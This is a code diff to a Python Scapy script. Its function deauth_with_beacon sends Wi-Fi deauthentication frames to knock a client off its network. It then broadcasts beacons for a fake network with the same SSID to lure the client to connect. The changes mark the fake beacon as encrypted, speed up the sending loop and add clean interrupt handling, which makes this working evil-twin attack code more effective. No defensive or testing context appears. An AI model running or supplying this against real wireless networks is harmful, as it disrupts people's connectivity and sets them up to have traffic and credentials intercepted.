@@ -35,7 +35,8 @@ def beacon(iface: str, BSSID: str, client: str, SSID: str):
 
 
 def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: str, reason: int = 7, timeout: int = 20):
-    """Send deauth and beacon packets to disconnect a client from a network, and then create a fake network with the same SSID to lure the client to connect to it.
+    """Send deauth and beacon packets to disconnect a client from a network, 
+       and then create a fake network with the same SSID to lure the client to connect to it.
 
     Args:
         iface (str): interafce to use
@@ -50,11 +51,14 @@ def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: 
         Dot11(type=0, subtype=12, addr1=deauth_client, addr2=deauth_BSSID, addr3=deauth_BSSID) / \
         Dot11Deauth(reason=reason)
     beacon_packet = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=beacon_BSSID, addr3=beacon_BSSID) / \
-        Dot11Beacon() / \
+        Dot11Beacon(cap='ESS+privacy') / \
         Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
-    for i in range(timeout * 10):
-        sendp(deauth_packet, iface=iface, count=1)
-        print(f'SENDING DEAUTH to {deauth_BSSID}')
-        sendp(beacon_packet, iface=iface, count=1)
-        print(f'SENDING BEACON for {beacon_BSSID}')
-        time.sleep(0.5)
+    try:
+        for i in range(timeout * 10):
+            sendp(deauth_packet, iface=iface, count=1)
+            print(f'SENDING DEAUTH to {deauth_BSSID}')
+            sendp(beacon_packet, iface=iface, count=1)
+            print(f'SENDING BEACON for {beacon_BSSID}')
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print("\nStopping...")
